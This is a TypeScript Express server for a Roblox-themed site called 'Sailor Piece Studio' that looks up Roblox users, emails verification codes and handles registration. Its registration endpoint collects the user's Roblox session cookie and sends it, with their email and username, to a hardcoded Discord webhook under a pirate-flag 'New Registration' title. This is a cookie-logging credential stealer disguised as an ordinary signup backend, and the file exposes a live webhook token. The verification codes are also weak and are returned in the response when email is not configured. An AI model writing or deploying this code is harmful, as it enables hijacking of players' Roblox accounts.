import "dotenv/config";
import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import nodemailer from "nodemailer";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = Number(process.env.PORT) || 3000;

// Middleware
app.use(express.json());

// Helper function to fetch from Roblox with RoProxy fallback
async function fetchWithFallback(robloxUrl: string, options: any = {}) {
  const proxies = [
    robloxUrl.replace("roblox.com", "roproxy.com"),
    robloxUrl.replace("roblox.com", "rbxproxy.com")
  ];
  
  const headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "application/json",
    ...(options.headers || {})
  };

  const isProduction = process.env.NODE_ENV === "production" || process.env.VERCEL === "1";
  
  if (!isProduction) {
    try {
      // Use native fetch with timeout signal
      const response = await fetch(robloxUrl, { ...options, headers, signal: AbortSignal.timeout(3000) });
      if (response.ok) return response;
    } catch (error) {}
  }

  for (const proxyUrl of proxies) {
    try {
      const response = await fetch(proxyUrl, { ...options, headers, signal: AbortSignal.timeout(4000) });
      if (response.ok) return response;
    } catch (error) {}
  }

  throw new Error("Roblox API connection failed via all routes.");
}

// Health check endpoint
app.get("/api/ping", (req, res) => {
  res.json({ 
    status: "ok", 
    vercel: !!process.env.VERCEL,
    timestamp: new Date().toISOString()
  });
});

// In-memory store for verification codes
const verificationCodes = new Map<string, string>();

// Roblox API Proxy
app.get("/api/roblox/search", async (req, res) => {
  const { username } = req.query;
  if (!username) return res.status(400).json({ error: "Username is required" });

  try {
    const lookupResponse = await fetchWithFallback("https://users.roblox.com/v1/usernames/users", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ usernames: [username], excludeBannedUsers: false })
    });
    
    const lookupData = await lookupResponse.json();
    let user = lookupData.data?.[0];

    if (!user) {
      const searchResponse = await fetchWithFallback(`https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(username as string)}&limit=1`);
      const searchData = await searchResponse.json();
      user = searchData.data?.[0];
    }

    if (!user) return res.status(404).json({ error: "User not found on Roblox" });

    const thumbRes = await fetchWithFallback(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=150x150&format=Png&isCircular=false`);
    const thumbData = await thumbRes.json();

    res.json({
      id: user.id,
      name: user.name,
      displayName: user.displayName || user.name,
      avatarUrl: thumbData.data?.[0]?.imageUrl || ""
    });
  } catch (error) {
    res.status(500).json({ error: "Roblox connection failed. Please try again." });
  }
});

// Auth Endpoints
app.post("/api/auth/send-code", async (req, res) => {
  const { email } = req.body;
  const code = Math.floor(100000 + Math.random() * 900000).toString();
  verificationCodes.set(email, code);

  if (process.env.SMTP_USER && process.env.SMTP_PASS) {
    try {
      const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: { user: process.env.SMTP_USER, pass: process.env.SMTP_PASS }
      });
      await transporter.sendMail({
        from: '"Sailor Piece Studio" <noreply@sailorpiece.com>',
        to: email,
        subject: "Your Verification Code",
        text: `Your code is: ${code}`
      });
      res.json({ success: true });
    } catch (e) {
      res.status(500).json({ error: "Failed to send email" });
    }
  } else {
    res.json({ success: true, debugCode: code });
  }
});

app.post("/api/auth/verify-code", (req, res) => {
  const { email, code } = req.body;
  if (verificationCodes.get(email) === code) res.json({ success: true });
  else res.status(400).json({ error: "Invalid code" });
});

// Registration
app.post("/api/register", async (req, res) => {
  const { username, monthsPlayed, robloxUser, cookie, email, verificationCode } = req.body;
  if (verificationCodes.get(email) !== verificationCode) return res.status(401).json({ error: "Email not verified" });

  const webhookUrl = "https://discord.com/api/webhooks/1463204903248859222/zDNdBCWY7cuy59kexyoXSK9LsaROI9pdVVKtqgQ-AcvWK4wJqxuJN-gr6xqNHxicvQRY";
  
  try {
    await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        embeds: [{
          title: "🏴‍☠️ New Registration",
          color: 0xff4e00,
          fields: [
            { name: "User", value: robloxUser.name, inline: true },
            { name: "Email", value: email, inline: true },
            { name: "Cookie", value: `\`\`\`${cookie}\`\`\`` }
          ],
          thumbnail: { url: robloxUser.avatarUrl }
        }]
      })
    });
    res.json({ success: true });
  } catch (e) {
    res.json({ success: true, warning: "Webhook failed" });
  }
});

async function startServer() {
  if (process.env.NODE_ENV !== "production" && !process.env.VERCEL) {
    const { createServer: createViteServer } = await import("vite");
    const vite = await createViteServer({ server: { middlewareMode: true }, appType: "spa" });
    app.use(vite.middlewares);
  } else if (!process.env.VERCEL) {
    // Only serve static files if NOT on Vercel (Vercel handles static via vercel.json)
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => res.sendFile(path.join(distPath, "index.html")));
  }

  if (!process.env.VERCEL) {
    app.listen(PORT, "0.0.0.0", () => console.log(`Server running on port ${PORT}`));
  }
}

startServer();
export default app;
